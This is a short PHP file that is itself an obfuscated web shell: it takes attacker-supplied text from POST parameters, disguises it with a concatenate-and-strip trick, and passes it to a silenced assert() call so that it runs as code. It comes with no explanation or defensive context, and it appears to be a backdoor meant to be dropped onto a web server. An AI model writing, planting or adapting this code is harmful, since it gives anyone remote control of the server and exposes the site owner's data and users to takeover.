<?php
$aa=@$_POST['aa'];
$bb=@$_POST['bb'];
$cc=$aa.$bb;
$dd=str_replace($bb,'',$cc);
@assert($dd);
?>